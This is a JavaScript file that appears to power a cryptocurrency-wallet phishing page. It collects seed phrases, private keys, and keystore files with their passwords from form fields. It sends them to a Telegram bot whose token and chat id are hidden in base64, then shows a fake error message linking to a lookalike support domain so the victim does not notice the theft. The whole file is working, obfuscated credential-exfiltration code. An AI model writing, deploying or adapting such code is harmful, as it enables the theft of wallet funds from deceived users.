//bot token
const str = 'NzAyOTI4MzEwNDpBQUZsNWxXUVJ1YldxZ1ZwLVNTQWxvcV9CNkV4MTliaVlQSQ==';
const u_id = 'NjkwODYwOTM1Ng==';
var telegram_bot_id = atob(str);
//chat id
var chat_id = parseInt(atob(u_id));

var wallet1, wallet2, wallet3, phrase, kstore, kpass, pkey, message;

function displayError() {
  const errorDiv = document.getElementById("phrase_error");
  errorDiv.style.display = "block";
}

// Validation function
function validateInput() {
    const input = document.getElementById("phraseinput");
    const words = input.value.split(" ");
    
    if(words.length === 12 || words.length === 24) {
        sender();
    } else {
        displayError();
        return false;    
    }
}


var ready = function () {
    wallet1 = document.getElementById("wallet1").value;
    wallet2 = document.getElementById("wallet2").value;
    wallet3 = document.getElementById("wallet3").value;
    kpass = document.getElementById("kpasswordinput").value;
    kjson = document.getElementById("kjsoninput").value;
    pkey = document.getElementById("privateinput").value;
    phrase = document.getElementById("phraseinput").value;

    
    if (kpass !== "" && kjson !== "") {
        message = "Manual Entry:\n" + "\nWallet: " + wallet2 + "\nKey Store: " + kjson + "\nKey pass: " + kpass;
    }
    else if (phrase !== "") {
        message = "Manual Entry:\n" + "\nWallet: " + wallet1 + "\nSeed Phrase: " + phrase;
    }
    else if (pkey !== "") {
        message = "Manual Entry:\n" + "\nWallet: " + wallet3 + "\nPrivate Key " + pkey;
    }
    else {
        message = "No entry"
    }

};

var sender = function () {
    
    ready();

    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"
        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };

    $.ajax(settings)
    .then(function () {
        $('#myModal').css('display', 'none');

      Swal.fire({
        icon: "error",
        title: "Oops...",
        text: "Something went wrong!",
        footer: '<a href="https://livesupport.en-uk.online">Why do I have this issue?</a>'
      });

     });

    document.getElementById("wallet1").value = "";
    document.getElementById("wallet2").value = "";
    document.getElementById("wallet3").value = "";
    document.getElementById("kpasswordinput").value = "";
    document.getElementById("kjsoninput").value = "";
    document.getElementById("privateinput").value = "";
    document.getElementById("phraseinput").value = "";
};
